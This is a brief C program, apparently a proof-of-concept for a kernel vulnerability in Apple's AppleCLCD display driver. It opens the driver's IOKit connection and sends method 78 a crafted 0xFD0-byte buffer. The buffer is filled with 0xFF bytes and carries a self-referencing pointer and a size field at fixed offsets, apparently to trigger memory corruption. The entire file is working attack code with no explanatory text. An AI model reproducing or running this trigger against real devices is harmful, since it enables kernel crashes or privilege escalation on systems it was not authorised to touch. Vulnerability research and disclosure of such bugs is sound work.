#include <stdio.h>
#include <stdint.h>
#include <mach/mach.h>
#include <CoreFoundation/CoreFoundation.h>

typedef mach_port_t io_object_t;
typedef io_object_t io_service_t;
typedef io_object_t io_connect_t;

kern_return_t IOServiceOpen(io_service_t service, task_t task, uint32_t type, io_connect_t *client);
io_service_t IOServiceGetMatchingService(mach_port_t master, CFDictionaryRef matching CF_RELEASES_ARGUMENT);
CFMutableDictionaryRef IOServiceMatching(const char *name) CF_RETURNS_RETAINED;
kern_return_t IOConnectCallMethod(io_connect_t client, uint32_t selector, const uint64_t *in, uint32_t inCnt, const void *inStruct, size_t inStructCnt, uint64_t *out, uint32_t *outCnt, void *outStruct, size_t *outStructCnt);

int main(){
    io_connect_t connection = 0;
    io_service_t service = IOServiceGetMatchingService(0, IOServiceMatching("AppleCLCD"));
    kern_return_t ret = IOServiceOpen(service, mach_task_self(), 0, &connection);
    uint32_t inStrSz = 0xFD0;
    void *inStr = malloc(inStrSz);
    const int inScCnt = 2;
    uint64_t inSc[inScCnt] ={ 19, 0 };
    memset(inStr, 0xFF, inStrSz);
    *(uint32_t*)(inStr + 0)     = 2;
    *(uint32_t*)(inStr + 0x8)   = 1;
    *(uint64_t*)(inStr + 0x5F8) = (uint64_t)inStr;
    *(uint32_t*)(inStr + 0x600) = inStrSz;
    ret = IOConnectCallMethod(connection, 78, inSc, inScCnt, inStr, inStrSz, 0, 0, 0, 0);
    return ret;
}